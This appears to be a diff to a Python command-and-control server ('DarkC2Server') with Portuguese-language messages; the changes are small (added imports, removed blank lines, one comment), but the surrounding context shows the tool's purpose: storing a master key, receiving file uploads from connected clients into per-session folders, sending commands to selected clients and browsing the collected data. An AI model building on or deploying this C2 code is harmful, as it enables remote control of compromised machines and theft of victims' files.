@@ -4,6 +4,7 @@ import json
 import socket
 import threading
 import hashlib
+import time
 from datetime import datetime
 from cryptography.fernet import Fernet
 from rich.console import Console
@@ -11,6 +12,7 @@ from rich.panel import Panel
 from rich.table import Table
 from rich.text import Text
 from rich.progress import Progress
+from rich.prompt import Prompt, IntPrompt  # Importação adicionada
 
 console = Console()
 
@@ -36,7 +38,6 @@ class DarkC2Server:
                 f.write(f"CHAVE-MESTRA: {self.server_key.decode()}\n")
 
     def _show_banner(self):
-   
         banner = """
 [bold red]
  ▄████████  ▄█     ▄████████    ▄█   ▄█▄    ▄████████ 
@@ -55,7 +56,6 @@ class DarkC2Server:
         console.print(banner)
 
     def _log_event(self, event_type, client_ip, details=""):
-
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         log_entry = f"[{timestamp}] [{event_type}] {client_ip} {details}\n"
         
@@ -119,7 +119,6 @@ class DarkC2Server:
             self._log_event("CONEXAO-ENCERRADA", client_ip, f"Sessão: {session_id}")
 
     def _handle_file_upload(self, conn, file_metadata, session_id, client_ip):
-    
         try:
             metadata = json.loads(file_metadata)
             filename = metadata["filename"]
@@ -128,7 +127,6 @@ class DarkC2Server:
             
             self._log_event("UPLOAD-INICIADO", client_ip, f"Arquivo: {filename} ({filesize} bytes)")
             
-      
             client_dir = os.path.join(self.data_dir, session_id)
             if not os.path.exists(client_dir):
                 os.makedirs(client_dir)
@@ -222,7 +220,6 @@ class DarkC2Server:
             self._log_event("ERRO-COMANDO", client_ip, f"Erro ao processar comando: {str(e)}")
 
     def _save_client_data(self, session_id, data_type, data):
-     
         client_dir = os.path.join(self.data_dir, session_id)
         if not os.path.exists(client_dir):
             os.makedirs(client_dir)
@@ -297,7 +294,6 @@ class DarkC2Server:
                 continue
 
     def _send_client_command(self):
-       
         if not self.clients:
             console.print("[red]Nenhum cliente conectado![/red]")
             input("\nPressione Enter para continuar...")
@@ -355,7 +351,6 @@ class DarkC2Server:
                 show_choices=False
             )
             
-
             console.print(f"[green]✓ Comando enviado para {selected_client['ip']}[/green]")
             self._log_event("COMANDO-ENVIADO", selected_client["ip"], f"Tipo: {cmd_choice}")
             
@@ -405,7 +400,6 @@ class DarkC2Server:
             input("\nPressione Enter para continuar...")
 
     def _show_session_data(self, session_id):
-       
         session_dir = os.path.join(self.data_dir, session_id)
         files = os.listdir(session_dir)
         
@@ -443,7 +437,6 @@ class DarkC2Server:
             self._display_file_content(session_dir, selected_file)
 
     def _display_file_content(self, session_dir, filename):
-    
         filepath = os.path.join(session_dir, filename)
         
         try:
@@ -537,7 +530,7 @@ class DarkC2Server:
                     border_style="green"
                 ))
                 
-              
+                # Thread para aceitar conexões
                 def accept_connections():
                     while True:
                         conn, addr = s.accept()
